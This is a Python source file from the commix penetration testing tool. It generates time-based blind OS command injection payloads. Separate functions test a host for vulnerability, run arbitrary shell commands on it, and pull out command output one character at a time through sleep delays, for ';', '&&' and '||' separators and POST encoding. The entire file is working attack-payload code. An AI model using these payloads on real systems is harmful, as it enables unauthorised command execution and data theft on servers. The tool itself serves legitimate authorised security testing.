#!/usr/bin/env python
# encoding: UTF-8

"""
 This file is part of commix tool.
 Copyright (c) 2015 Anastasios Stasinopoulos (@ancst).
 https://github.com/stasinopoulos/commix

 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 For more see the file 'readme/COPYING' for copying permission.
"""

"""
  The "time-based" injection technique on Blind OS Command Injection.
  The available "time-based" payloads.
"""

import urllib

# Time-based decision payload (check if host is vulnerable).
def decision(seperator,TAG,j,delay,http_request_method):
  if seperator == ";" :
    payload = (seperator + " "
	      "str=$(echo "+TAG+")" + seperator + " "
	      # Find the length of the output.
	      "str1=${#str}" + seperator + " "
	      "if [ \"" + str(j) + "\" -ne ${str1} ]" + seperator  + " "
	      "then sleep 0" + seperator + " "
	      "else sleep " + str(delay) + seperator + " "
	      "fi "
	      )
    
  elif seperator == "&&" :
    if http_request_method == "POST":
      seperator = urllib.quote(seperator)
      ampersand = urllib.quote("&")
    else:
      ampersand = "&"
    payload = (ampersand + " " +
	      "sleep 0  " + seperator + " "
	      "str=$(echo "+TAG+") " + seperator + " "
	      # Find the length of the output.
	      "str1=${#str} " + seperator + " "
	      "[ " + str(j) + " -eq ${str1} ] " + seperator + " "
	      "sleep 1 "
	      )
    if http_request_method == "POST":
      seperator = urllib.unquote(seperator)

  elif seperator == "||" :
    payload = (seperator + " "
	      "[ "+str(j)+" -ne $(echo \""+TAG+"\" | wc -c) ] " + seperator + " "
	      "sleep " + str(delay) + " "
	      )  
  else:
    pass
  
  return payload

# Execute shell commands on vulnerable host.
def cmd_execution(seperator,cmd,j,delay,http_request_method):
  if seperator == ";" :
    payload = (seperator + " "
	      "str=$("+ cmd +")" + seperator +
	      "str1=${#str}" + seperator +
	      "if [ \"" + str(j) + "\" != ${str1} ]; " +
	      "then sleep 0" + seperator +
	      "else sleep " + str(delay) + seperator +
	      "fi "
	      )
	      
  if seperator == "&&" :
    if http_request_method == "POST":
      seperator = urllib.quote(seperator)
      ampersand = urllib.quote("&")
    else:
      ampersand = "&"
    payload = (ampersand + " " +
	      "sleep 0  " + seperator + " "
	      "str=$(\""+cmd+"\")  " + seperator + " "
	      # Find the length of the output.
	      "str1=${#str}  " + seperator + " "
	      "[ " + str(j) + " -eq ${str1} ] " + seperator + " "
	      "sleep 1 "
	      )
    if http_request_method == "POST":
      seperator = urllib.unquote(seperator)
      
  if seperator == "||" :
    payload = (seperator + " "
	      "[ "+str(j)+" -ne $(\""+cmd+"\" | wc -c) ] " + seperator + 
	      "sleep " + str(delay) + " "
	      )
  return payload

# Get the execution ouput, of shell execution.
def get_char(seperator,cmd,i,ascii_char,delay,http_request_method):
  if seperator == ";" :
    payload = (seperator + " "
	      "str=$(" + cmd + "|tr '\n' ' '|cut -c " + str(i) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2)" + seperator +
	      "if [ \"" + str(ascii_char) + "\" != ${str} ]" + seperator +
	      "then sleep 0" + seperator +
	      "else sleep " + str(delay) + seperator +
	      "fi "
	      )

  if seperator == "&&" :
    if http_request_method == "POST":
      seperator = urllib.quote(seperator)
      ampersand = urllib.quote("&")
    else:
      ampersand = "&"
    payload = (ampersand + " " +
	      "sleep 0  " + seperator + " "
	      "str=$(" + cmd + "|tr '\n' ' '|cut -c " + str(i) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) " + seperator + " "
	      "[ " + str(ascii_char) + " -eq ${str} ] " + seperator + " "
	      "sleep 1 "
	      )
    if http_request_method == "POST":
      seperator = urllib.unquote(seperator)

  if seperator == "||" :
    payload = (seperator + " "
	      "[ \"" + str(ascii_char) + "\" -ne  $(" + cmd + "|tr '\n' ' '|cut -c " + str(i) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) ] " + seperator + 
	      "sleep " + str(delay) + " "
	      )		
  return payload